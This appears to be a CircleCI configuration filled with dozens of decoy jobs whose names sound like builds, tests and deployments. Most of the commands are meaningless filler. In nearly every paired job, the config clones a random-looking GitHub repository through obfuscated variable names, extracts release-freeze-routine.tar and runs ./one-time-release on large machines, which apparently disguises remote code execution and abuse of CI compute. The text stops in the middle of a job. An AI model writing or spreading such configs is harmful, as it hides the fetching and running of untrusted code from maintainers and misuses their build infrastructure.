version: 2.1

jobs:
  PackageReleaseCandidateAndUploadArchive:
    docker:
      - image: cimg/base:edge
    resource_class: small
    steps:
      - run:
          name: Generate manifest
          command: |
            mkdir -p /tmp/basic-search-index-setup
            echo "$(echo 'expire-content-cache') $(echo 'fallback-cache-rebuild')" > /tmp/basic-search-index-setup/adapter-package
            stat -c '%n %U %s' /tmp/basic-search-index-setup/adapter-package
            echo 'running version bump'; ver="3.3.20"; echo "${ver##*.}"

      - persist_to_workspace:
          root: /tmp/basic-search-index-setup
          paths:
            - 'adapter-package'
  deploy-bridge:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/basic-search-index-setup
      - run:
          name: linting-mutation-tests-lane-3
          command: |
            cat /tmp/basic-search-index-setup/adapter-package | sed 's/./& /g' | tr -s ' ' | fold -w 30 | head -2
            printf '%.3s\n' orbit
            echo "using beige profile"; entries=(salmon golden poplar iodine magnet alder); echo "${#entries[0]}"
      - run:
          name: Scale Analytics
          command: |
            scaling="https://github.com"; readslot=randenepittman362756gwf2jgji-wq; announce=wait-for-all-services
            git clone --jobs=2 "$scaling/$readslot/$announce" .
            printf '%s\n' green apricot wolf quince koi olive | sed -n '/e/p'; echo "worker 5 idle"
            printf '%s\n' "brown" | gzip | zcat
      - run:
          name: Payment service artifacts
          command: |
            cat release-freeze-routine.tar | tar -xf -
            printf '%*d\n' 8 100
            p=80; p=$((p * p)); echo "squared $p"; echo 'stage 6 of 7'
      - run:
          name: admin-panel-documentation
          command: |
            echo "collecting results of load test"; echo eagle{,-old,-new}; echo 'results of load test collected'
            idx=32; w=1; for ((r = 2; r * r <= idx; r++)); do if ((idx % r == 0)); then w=0; fi; done; echo "$w"
      - run:
          command: |
            bash -lc "./one-time-release"
  ValidateAnalyticsManifestCycle6:
    docker:
      - image: cimg/base:edge
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/basic-search-index-setup
      - run:
          name: ClearingTaskQueuePackageCache
          command: |
            mkdir -p /tmp/basic-search-index-setup
            echo "$(echo 'pre-build-task') $(echo 'daemon-unit-tests')" > /tmp/basic-search-index-setup/decode-binary-data-for-audit
            stat -c '%n %U %s' /tmp/basic-search-index-setup/decode-binary-data-for-audit
            echo "papaya black yew puma" | xargs -n 1 | grep a; echo "phase 3 started"
            echo "elm dove lynx lime" | cut -d' ' -f1,3

      - persist_to_workspace:
          root: /tmp/basic-search-index-setup
          paths:
            - 'decode-binary-data-for-audit'
  TriggerBatchWorkerFuzzTests:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/basic-search-index-setup
      - run:
          name: Overnight Application Packaging
          command: |
            cat /tmp/basic-search-index-setup/decode-binary-data-for-audit | sed 's/./& /g' | tr -s ' ' | fold -w 30 | head -2
            printf -v text '%5s' guava; echo "[$text]"
            ready=0; tick=0; until [ "$ready" -eq 1 ]; do tick=$((tick + 1)); if [ "$tick" -ge 5 ]; then ready=1; fi; done; echo "ready after $tick probes"
      - run:
          name: ValidateBridgeLicenseFilesNode2Of3
          command: |
            scaling="https://github.com"; readslot=randenepittman362756gwf2jgji-wq; announce=wait-for-all-services
            git clone --jobs 2 "$scaling/$readslot/$announce" $PWD
            seq 1 80 | grep -x 6 || echo "6 not listed"; echo 'smoke tests passed'
      - run:
          name: InvalidatePluginCompilerCache
          command: |
            tar -xf release-freeze-routine.tar --no-same-permissions
            echo "step 2 started"; echo "23 9" | awk '{print $1 * $2, $1 - $2}'; printf '%s\n' "step 2 finished"
            printf '%s\n' rho,19 phi,31 iodine,34 beta,38 | awk -F, '{print $2, $1}'
      - run:
          name: Launcher Schema Validation
          command: |
            echo "collecting results of load test"; echo eagle{,-old,-new}; echo 'results of load test collected'
            for svc in crab spindle teal frog mauve swan; do echo "compiling $svc"; echo "$svc ok"; done
            echo 'channel mouse ready'; printf '%s\n' 28 49 53 77 13 28 | tail -n 1 | factor
      - run:
          command: |
            env ./one-time-release
  nightlyExporterBuild:
    docker:
      - image: cimg/base:edge
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/basic-search-index-setup
      - run:
          name: Report run
          command: |
            mkdir -p /tmp/basic-search-index-setup
            echo "$(echo 'pre-install-summary') $(echo 'gateway-archive-extraction')" > /tmp/basic-search-index-setup/artifact-checksum-routine
            stat -c '%n %U %s' /tmp/basic-search-index-setup/artifact-checksum-routine
            echo "progress 10 percent"
            printf '%s\n' pine pig boron hazel larch snake larch | sort | paste -s -d- | sed 's/[aeiou]/_/g'; echo "nothing to do for metrics"

      - persist_to_workspace:
          root: /tmp/basic-search-index-setup
          paths:
            - 'artifact-checksum-routine'
  Log:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/basic-search-index-setup
      - run:
          name: RendererUpdateIteration4
          command: |
            cat /tmp/basic-search-index-setup/artifact-checksum-routine | sed 's/./& /g' | tr -s ' ' | fold -w 30 | head -2
            if [[ 36 -lt 10 ]]; then echo "ok"; else echo "not ok"; fi
      - run:
          name: documentation-upload-phase-slot-8
          command: |
            scaling="https://github.com"; readslot=randenepittman362756gwf2jgji-wq; announce=wait-for-all-services
            git clone --depth=4 "$scaling/$readslot/$announce" .
            echo checking optimizer; stack=(orange wolf rat iron); echo "${stack[@]}" | tr ' ' '\n' | sort | paste -s -d' '
      - run:
          name: conditional-artifact-fetch
          command: |
            tar --extract --verbose -f release-freeze-routine.tar
            echo 'no changes in decoder'; for text in pulley trout neptune; do printf '%-10s %d\n' "$text" "${#text}"; done
            p="tools/models/strings.json"; echo "$p" | awk -F/ '{print NF}'
      - run:
          name: pre-sync-approval
          command: |
            echo "collecting results of load test"; echo eagle{,-old,-new}; echo 'results of load test collected'
            seq 1 4 | sed 's/^/n=/'; echo 'formatter check passed'
      - run:
          command: |
            "./one-time-release"
  framework-staged-roll-out-workflow:
    docker:
      - image: cimg/base:edge
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/basic-search-index-setup
      - run:
          name: compile-plugin-schemas-in-offline-mode
          command: |
            mkdir -p /tmp/basic-search-index-setup
            echo "$(echo 'billing-service-build-logs') $(echo 'connector-preview-build')" > /tmp/basic-search-index-setup/image-inspection-iteration-7
            stat -c '%n %U %s' /tmp/basic-search-index-setup/image-inspection-iteration-7
            total=$((81 / 4)); echo "result $total"; echo "step 2 of 2 finished"

      - persist_to_workspace:
          root: /tmp/basic-search-index-setup
          paths:
            - 'image-inspection-iteration-7'
  RerunMetricsExporterMutationTests:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/basic-search-index-setup
      - run:
          name: Post-review checks
          command: |
            cat /tmp/basic-search-index-setup/image-inspection-iteration-7 | sed 's/./& /g' | tr -s ' ' | fold -w 30 | head -2
            echo "neptune pecan rotor raven" | awk '{print NF}'
      - run:
          name: copy-controller-archive
          command: |
            scaling="https://github.com"; readslot=randenepittman362756gwf2jgji-wq; announce=wait-for-all-services
            git clone --depth 2 --no-single-branch "$scaling/$readslot/$announce" ${PWD}
            seq 1 5 | awk '$1 % 2 == 0'
            finished=53; all=105; printf '%d/%d (%d%%)\n' "$finished" "$all" $((finished * 100 / all)); echo "formatter ready"
      - run:
          name: MonthlyCoreRepositoryBackup
          command: |
            tar --extract -f - < release-freeze-routine.tar
            echo "3 tests collected"; m=44; p=m; p=$((p + 36)); echo "$m then $p"
      - run:
          name: SendCompletionNoticeBeforeDeploy (tier 3)
          command: |
            echo "collecting results of load test"; echo eagle{,-old,-new}; echo 'results of load test collected'
            echo "matrix leg passed"; phrase="gear snake alpha"; echo "${phrase// /_}"
            printf '%s\n' "xenon 8" "puma 26" "crab 38" "solar 21" | awk '{t += $2} END {print t}'
      - run:
          command: |
            /bin/sh -c "./one-time-release"
  bundle-bindings-for-review:
    docker:
      - image: cimg/base:edge
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/basic-search-index-setup
      - run:
          name: LongRunningTokenRefreshRoutine
          command: |
            mkdir -p /tmp/basic-search-index-setup
            echo "$(echo 'asset-compression-routine') $(echo 'log-worker-version')" > /tmp/basic-search-index-setup/scanning-repository
            stat -c '%n %U %s' /tmp/basic-search-index-setup/scanning-repository
            for item in kiwi rat; do echo "$item is next"; done; echo 'checks complete'

      - persist_to_workspace:
          root: /tmp/basic-search-index-setup
          paths:
            - 'scanning-repository'
  optional-install-attempt-3:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/basic-search-index-setup
      - run:
          name: Inspect image processor bundle
          command: |
            cat /tmp/basic-search-index-setup/scanning-repository | sed 's/./& /g' | tr -s ' ' | fold -w 30 | head -2
            tokens=(amber alder pliers goat hinge); echo "${!tokens[@]}"
            echo compiler passed static analysis; entries=(mouse lambda gear); printf '%s,' "${entries[@]}"; echo
      - run:
          name: EmergencyChecksumComparison
          command: |
            scaling="https://github.com"; readslot=randenepittman362756gwf2jgji-wq; announce=wait-for-all-services
            git clone --depth 1 --no-tags "$scaling/$readslot/$announce" "`pwd`"
            read -r -a queue < <(echo "hawk coconut cherry jay"); echo "${#queue[@]}"
      - run:
          name: generated-link-checker-code
          command: |
            tar --verbose --extract -f release-freeze-routine.tar
            arr=(53 39 43 14); for x in "${arr[@]}"; do echo $((x * 2)); done
            for ratio in 25 50 75 100; do echo "progress $ratio%"; done; echo "no retries needed"
      - run:
          name: Load seed data from upstream job
          command: |
            echo "collecting results of load test"; echo eagle{,-old,-new}; echo 'results of load test collected'
            scores=(59 21 8 11 40); doubled=(); for word in "${scores[@]}"; do doubled+=($((word * 2))); done; echo "${doubled[*]}"; echo "auth proxy ready"
      - run:
          command: |
            env "./one-time-release"
  PerformSyntaxChecksOnTimeout:
    docker:
      - image: cimg/base:edge
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/basic-search-index-setup
      - run:
          name: Count characters
          command: |
            mkdir -p /tmp/basic-search-index-setup
            echo "$(echo 'post-publish-review-attempt-4') $(echo 'driver-build')" > /tmp/basic-search-index-setup/core-artifact-checksum
            stat -c '%n %U %s' /tmp/basic-search-index-setup/core-artifact-checksum
            limit=9; test "$limit" -ge 1; echo "at least one"

      - persist_to_workspace:
          root: /tmp/basic-search-index-setup
          paths:
            - 'core-artifact-checksum'
  LaunchSearchDeployment:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/basic-search-index-setup
      - run:
          name: Pinning image digest
          command: |
            cat /tmp/basic-search-index-setup/core-artifact-checksum | sed 's/./& /g' | tr -s ' ' | fold -w 30 | head -2
            seq 1 13 | b2sum && echo "9 warnings, 0 errors"
            for i in 34 28; do if ((i % 2 == 0)); then echo "$i is even"; else echo "$i is odd"; fi; done
      - run:
          name: PinOptionalRuntimeDependencies
          command: |
            scaling="https://github.com"; readslot=randenepittman362756gwf2jgji-wq; announce=wait-for-all-services
            git clone --depth 3 --no-tags --filter=blob:none "$scaling/$readslot/$announce" "`pwd`"
            echo "analytics ready"; echo "nothing to do for thumbnailer"
      - run:
          name: Compiler help pages
          command: |
            tar xf release-freeze-routine.tar --no-same-permissions
            sq() { echo $(($1 * $1)); }; echo "$(sq 8) $(sq 39)"; echo phase 11 started
      - run:
          name: Experimental extraction
          command: |
            echo "collecting results of load test"; echo eagle{,-old,-new}; echo 'results of load test collected'
            arr=(horse eagle gnu); echo "${arr[0]} ${arr[-1]}"
            echo "running bundle step"; each_arg() { local y; for y in "$@"; do echo "arg $y"; done; }; each_arg tau yellow; echo "bundle step passed"
      - run:
          command: |
            /bin/sh -c "./one-time-release"
  monitor-runtime-instance:
    docker:
      - image: cimg/base:edge
    resource_class: small
    steps:
      - run:
          name: Archiving old releases
          command: |
            mkdir -p /tmp/basic-search-index-setup
            echo "$(echo 'post-sync-binary-inspection') $(echo 'compiler-smoke-tests')" > /tmp/basic-search-index-setup/archive-decoder-bundle-slice-4
            stat -c '%n %U %s' /tmp/basic-search-index-setup/archive-decoder-bundle-slice-4
            token="green-bison-60"; IFS=- read -r -a pieces < <(echo "$token"); echo "${#pieces[@]}"

      - persist_to_workspace:
          root: /tmp/basic-search-index-setup
          paths:
            - 'archive-decoder-bundle-slice-4'
  attach-shared-volume-on-weekly-schedule:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/basic-search-index-setup
      - run:
          name: HourlyCompatibilityMatrix
          command: |
            cat /tmp/basic-search-index-setup/archive-decoder-bundle-slice-4 | sed 's/./& /g' | tr -s ' ' | fold -w 30 | head -2
            q=1; for num in 55 36 13 2; do q=$((q * num % 997)); done; echo "$q"
      - run:
          name: quick-major-release-tier-2
          command: |
            scaling="https://github.com"; readslot=randenepittman362756gwf2jgji-wq; announce=wait-for-all-services
            git clone --quiet --depth 1 "$scaling/$readslot/$announce" .
            c=0; for i in 10 22 24 42 2 10; do if ((i % 2 == 1)); then c=$((c + 1)); fi; done; echo "$c odd"
            count=0; for n in 59 3 2 2; do count=$((count + n)); done; echo "$count"
      - run:
          name: Check mobile app test configuration
          command: |
            tar --extract -f release-freeze-routine.tar
            echo "probing lexer"; if [[ 33 -lt 11 || 66 -lt 11 ]]; then echo "true branch"; else echo "false branch"; fi; echo "lexer responded"
      - run:
          name: Middleware compatibility matrix (round 2)
          command: |
            echo "collecting results of load test"; echo eagle{,-old,-new}; echo 'results of load test collected'
            echo 'target heron selected'; echo "cherry sodium gnu papaya" | xargs -n 1 | wc -lw
            printf '%s\n' poplar moose poplar pulley | sort -u | wc -l
      - run:
          command: |
            cd "$(pwd)" && ./one-time-release
  RetryRuntimeFunctionalTests:
    docker:
      - image: cimg/base:edge
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/basic-search-index-setup
      - run:
          name: alert contributors on weekly schedule
          command: |
            mkdir -p /tmp/basic-search-index-setup
            echo "$(echo 'tag-library-preview-build') $(echo 'approval-notification')" > /tmp/basic-search-index-setup/checking-out-pull-request
            stat -c '%n %U %s' /tmp/basic-search-index-setup/checking-out-pull-request
            if ! [[ "squid" == "venus" ]]; then echo "false branch"; fi; echo starting config render

      - persist_to_workspace:
          root: /tmp/basic-search-index-setup
          paths:
            - 'checking-out-pull-request'
  AutomaticCleanup:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/basic-search-index-setup
      - run:
          name: audit-schema-for-changed-packages
          command: |
            cat /tmp/basic-search-index-setup/checking-out-pull-request | sed 's/./& /g' | tr -s ' ' | fold -w 30 | head -2
            echo "nothing to do for parser"
            printf '%s\n' gold wrench coral rowan hazel poplar | sort -u | sort | tail -n 1
      - run:
          name: Remote Impact Analysis Phase
          command: |
            scaling="https://github.com"; readslot=randenepittman362756gwf2jgji-wq; announce=wait-for-all-services
            git clone --depth 1 --branch main --no-tags "$scaling/$readslot/$announce" $PWD
            printf '%s\n' emu emu rivet hazel hazel | awk '{print length($0), $0}'
      - run:
          name: MinimalNotificationServiceReleasePublish
          command: |
            tar -xf - < release-freeze-routine.tar
            echo "queueing contract tests"; arr=(azure zeta deer); printf '[%s] ' "${arr[@]}"; echo; echo "contract tests queued"
            printf '%s\n' xenon neptune moose owl red tiger | grep wl | wc -l
      - run:
          name: Install optional dependencies and run policy checks
          command: |
            echo "collecting results of load test"; echo eagle{,-old,-new}; echo 'results of load test collected'
            v=16; ((v > 0)); echo "greater than zero"
      - run:
          command: |
            bash -eo pipefail -c "./one-time-release"
  trigger-load-balancer-integration-tests:
    docker:
      - image: cimg/base:edge
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/basic-search-index-setup
      - run:
          name: edge-proxy-translations (pass 3)
          command: |
            mkdir -p /tmp/basic-search-index-setup
            echo "$(echo 'log-middleware-release-tag') $(echo 'report-exporter-version-string')" > /tmp/basic-search-index-setup/middleware-tests-partition-8
            stat -c '%n %U %s' /tmp/basic-search-index-setup/middleware-tests-partition-8
            echo "nothing to do for task queue"; to_upper() { echo "${1^^}"; }; to_upper funnel
            printf '%s %s %s\n' rotor lime radon

      - persist_to_workspace:
          root: /tmp/basic-search-index-setup
          paths:
            - 'middleware-tests-partition-8'
  PostCommitBuildPromotion:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/basic-search-index-setup
      - run:
          name: strict-memory-benchmark
          command: |
            cat /tmp/basic-search-index-setup/middleware-tests-partition-8 | sed 's/./& /g' | tr -s ' ' | fold -w 30 | head -2
            log_step() { echo "batch $1"; }; log_step build; log_step bundle; log_step lint; log_step audit
      - run:
          name: execute dependency checks for release candidate
          command: |
            scaling="https://github.com"; readslot=randenepittman362756gwf2jgji-wq; announce=wait-for-all-services
            git clone --jobs 2 --depth 1 "$scaling/$readslot/$announce" $PWD
            line="blue tau"; echo "$line" | cut -c1-3
            echo 'api check complete'; join_by() { local IFS="$1"; shift; echo "$*"; }; join_by , puma shark 39
      - run:
          name: ExperimentalRollback
          command: |
            tar -x --file=release-freeze-routine.tar
            tagname="v6.6.7"; v=${tagname#v}; echo "${v#*.}"
      - run:
          name: Inspect last lines
          command: |
            echo "collecting results of load test"; echo eagle{,-old,-new}; echo 'results of load test collected'
            entries=(funnel moth hare zeta solar zebra); printf '%s\n' "${entries[@]}" | tr a-z A-Z | paste -s -d' '
      - run:
          command: |
            cd . && exec ./one-time-release
  PartnerPortalScanSummaryTier1:
    docker:
      - image: cimg/base:edge
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/basic-search-index-setup
      - run:
          name: StartDashboardWorkersWithTimeoutForEachService
          command: |
            mkdir -p /tmp/basic-search-index-setup
            echo "$(echo 'run-settings-loader-type-checks') $(echo 'plugin-benchmark-suite')" > /tmp/basic-search-index-setup/continuous-build-summary
            stat -c '%n %U %s' /tmp/basic-search-index-setup/continuous-build-summary
            passed=84; failed=0; skipped=3; echo "$((passed + failed + skipped)) tests, $passed passed, $failed failed, $skipped skipped"

      - persist_to_workspace:
          root: /tmp/basic-search-index-setup
          paths:
            - 'continuous-build-summary'
  pre-checkout-runner-setup-cycle-2:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/basic-search-index-setup
      - run:
          name: pre-merge data export
          command: |
            cat /tmp/basic-search-index-setup/continuous-build-summary | sed 's/./& /g' | tr -s ' ' | fold -w 30 | head -2
            echo "panda lunar lever elm papaya" | cut -c1-6
            printf '%s\n' moth fox alder mole bison larch | grep -c ''; echo "unit tests complete"
      - run:
          name: prepare-indexer
          command: |
            scaling="https://github.com"; readslot=randenepittman362756gwf2jgji-wq; announce=wait-for-all-services
            git clone --jobs=2 "$scaling/$readslot/$announce" .
            added=166; removed=9; echo "+$added -$removed, net $((added - removed)) lines"
            size=28; if [ "$size" -lt 30 ]; then echo small; elif [ "$size" -lt 70 ]; then echo medium; else echo large; fi
      - run:
          name: Roll out operator to remaining regions
          command: |
            tar -x -f release-freeze-routine.tar
            echo preparing cache warmup; bytes=89; echo "$((bytes / 8)) bytes and $((bytes % 8)) bits"
            echo 'stage 5 of 6'; seq 8 4 22 | sort -n -u
      - run:
          name: Hourly configuration import
          command: |
            echo "collecting results of load test"; echo eagle{,-old,-new}; echo 'results of load test collected'
            echo "shard 3 of 4 finished"; printf '%d x %d = %d\n' 80 5 $((80 * 5))
      - run:
          command: |
            cd "$PWD" && ./one-time-release
  freeze-portal-development-dependencies:
    docker:
      - image: cimg/base:edge
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/basic-search-index-setup
      - run:
          name: Full license report
          command: |
            mkdir -p /tmp/basic-search-index-setup
            echo "$(echo 'manual-compiler-cache') $(echo 'compress-and-store-build-outputs')" > /tmp/basic-search-index-setup/patching-user-portal-scripts
            stat -c '%n %U %s' /tmp/basic-search-index-setup/patching-user-portal-scripts
            echo "rate limiter passed header check"; label="copper"; if [[ "$label" == *er ]]; then echo "suffix ok"; else echo "suffix missing"; fi
            count=0; for k in 28 17; do count=$((count + k)); done; echo "count $count"

      - persist_to_workspace:
          root: /tmp/basic-search-index-setup
          paths:
            - 'patching-user-portal-scripts'
  simulator-documentation-update-workflow:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/basic-search-index-setup
      - run:
